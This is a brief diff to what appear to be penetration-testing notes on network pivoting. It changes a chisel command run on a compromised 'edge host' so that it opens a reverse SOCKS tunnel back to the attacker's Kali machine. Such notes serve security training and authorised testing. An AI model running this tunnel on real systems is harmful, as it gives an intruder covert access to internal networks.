@@ -35,5 +35,5 @@ On attacker host (Kali)
 
 on the edge host
 ```bash
-./chisel client {edge_host_ip}:8000 R:socks
+./chisel client {attacker_host_ip}:8000 R:socks
 ```
